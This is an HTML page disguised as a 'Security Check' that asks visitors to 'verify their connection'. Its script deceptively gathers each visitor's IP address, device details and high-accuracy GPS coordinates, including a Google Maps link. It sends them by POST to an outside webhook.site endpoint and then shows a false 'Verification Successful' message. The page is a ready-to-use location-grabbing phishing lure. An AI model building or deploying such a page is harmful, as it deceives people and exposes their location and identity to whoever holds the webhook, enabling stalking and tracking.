<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 90%; }
        h2 { color: #333; margin-bottom: 15px; font-size: 22px; }
        p { color: #777; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        button { background-color: #007bff; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; width: 100%; transition: 0.3s; }
        button:hover { background-color: #0056b3; }
        #loader { margin-top: 20px; font-size: 13px; color: #007bff; display: none; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <h2>Security Check</h2>
    <p>To continue to the destination, please verify your network connection and device security.</p>
    <button id="verifyBtn">Verify Connection</button>
    <div id="loader">Communicating with server...</div>
</div>

<script>
    // Your specific Webhook URL
    const WEBHOOK_URL = 'https://webhook.site/6a34e8ff-8421-43b5-ab7a-ec11970fde41';

    document.getElementById('verifyBtn').addEventListener('click', function() {
        document.getElementById('loader').style.display = 'block';
        document.getElementById('verifyBtn').disabled = true;
        document.getElementById('verifyBtn').innerText = "Verifying...";

        let report = {
            timestamp: new Date().toLocaleString(),
            device_info: {
                browser: navigator.userAgent,
                platform: navigator.platform,
                screen: window.screen.width + "x" + window.screen.height,
                language: navigator.language
            }
        };

        // STEP 1: Get IP Address
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                report.ip_address = ipData.ip;
                
                // STEP 2: Get Exact GPS Location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            report.exact_location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + " meters",
                                google_maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                            };
                            sendData(report);
                        },
                        (error) => {
                            report.gps_status = "Denied/Blocked by User";
                            sendData(report);
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                } else {
                    report.gps_status = "Not Supported";
                    sendData(report);
                }
            })
            .catch(err => {
                report.error = "Connection failed";
                sendData(report);
            });
    });

    function sendData(data) {
        // Send the findings to your Webhook.site dashboard
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            setTimeout(() => {
                alert("Verification Successful. You may now proceed.");
                document.getElementById('loader').innerText = "Status: Secure";
            }, 1000);
        });
    }
</script>

</body>
</html>
